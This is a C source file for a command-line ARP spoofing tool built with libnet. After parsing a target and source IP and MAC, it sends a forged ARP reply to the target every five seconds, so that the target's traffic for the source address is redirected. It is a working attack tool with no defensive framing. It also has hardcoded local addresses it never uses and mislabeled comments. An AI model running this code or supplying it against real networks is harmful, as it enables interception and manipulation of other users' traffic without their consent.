#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <unistd.h>

void usage(){
        printf("Extracting commandline arguments failed\n");
        printf("Please refer to usage");
        printf("arpspoof [targetIP] [targetMAC] [sourceIP] [sourceMAC]\n");
        exit(EXIT_FAILURE);
}

int main(int argc, char **argv){

        char *local_ip_p = "192.168.1.27";
        char *local_mac_p = "60:35:C0:61:C1:B0";
        uint32_t local_ip;                      // Local IP address
        uint8_t *local_mac;                     // local MAC address
        int A_length;

        libnet_ptag_t t_arp;                    // ARP packet to target ptag
        libnet_ptag_t g_arp;                    // ARP packet to source ptag

        libnet_ptag_t t_eth;                    // Ethernet packet to target ptag
        libnet_ptag_t g_eth;                    // Ethernet packet to source ptag

        uint32_t target_ip;                     // Target IP address
        uint8_t *target_mac;                    // Target MAC address
        uint32_t source_ip;                     // Source IP address
        uint8_t *source_mac;                    // Source MAC address
        int T_length, G_length;


        if(argc != 5){
                usage();
        };

        libnet_t *l; // Libnet context
        char err_buf[LIBNET_ERRBUF_SIZE];

        l = libnet_init(LIBNET_LINK, NULL, err_buf);

        // If initialization failed
        if(l == NULL){
                fprintf(stderr, "libnet_init() failed: %s\n", err_buf);
                exit(EXIT_FAILURE);
        };

        // Extracting commandline arguments and Parsing
        printf("Parsing user input\n");
        target_ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE);
        target_mac = libnet_hex_aton(argv[2], &T_length);
        source_ip = libnet_name2addr4(l, argv[3], LIBNET_DONT_RESOLVE);
        source_mac= libnet_hex_aton(argv[4], &G_length);
        if(target_ip == -1 || target_mac == NULL || source_ip == -1 || source_mac == NULL){
                printf("Failed to parse user input\n");
                exit(EXIT_FAILURE);
        };

        // Fetch local IP and MAC addresses
        printf("Fetching Local IP address\n");
        local_ip = libnet_name2addr4(l, local_ip_p, LIBNET_DONT_RESOLVE);
        printf("Fetching Local MAC address\n");
        local_mac = libnet_hex_aton(local_mac_p, &A_length);
        if(local_ip == -1 || local_mac == NULL){
                fprintf(stderr, "Failed to fetch local IP and/or MAC adresses: %s\n", libnet_geterror(l));
                exit(EXIT_FAILURE);
        };

        while(1){
                // Build ARP packets
                printf("Building ARP headers\n");
                // >> To Target
                t_arp = libnet_autobuild_arp(
                                                ARPOP_REPLY,                                    // ARP operation (REPLY)
                                                source_mac,                                     // Local MAC address
                                                (uint8_t *) &source_ip,                         // Source IP address
                                                target_mac,                                     // Target IP address
                                                (uint8_t *) &target_ip,                         // Target MAC address
                                                l                                               // libnet Context
                                        );
                if(t_arp == -1){
                        fprintf(stderr, "Unable to build ARP header (to Target): %s\n", libnet_geterror(l));
                        exit(EXIT_FAILURE);
                };

                // Build Ethernet packets
                printf("Building Ethernet headers\n");
                // >> To Target
                t_eth = libnet_build_ethernet(
                                                target_mac,                                     // Target MAC address
                                                (uint8_t *) source_mac,                         // Local MAC address
                                                ETHERTYPE_ARP,                                  // Type of upper protocol (ARP)
                                                NULL,                                           // Payload
                                                0,                                              // Payload length
                                                l,                                              // Libnet Context
                                                0                                               // Ptag to build packet
                                        );
                if(t_eth == -1){
                        fprintf(stderr, "Unable to build ETHERNET header (to Target): %s\n", libnet_geterror(l));
                        exit(EXIT_FAILURE);
                };

                // Write Packets
                printf("Writing packets...\n");
                if ((libnet_write(l)) == -1){
                        fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
                        exit(EXIT_FAILURE);
                };

                // Timeout
                sleep(5);

        }

        // Clean & Exit
        printf("Quitting...\n");
        free(target_mac);
        free(source_mac);

        libnet_destroy(l);

        return 0;
};
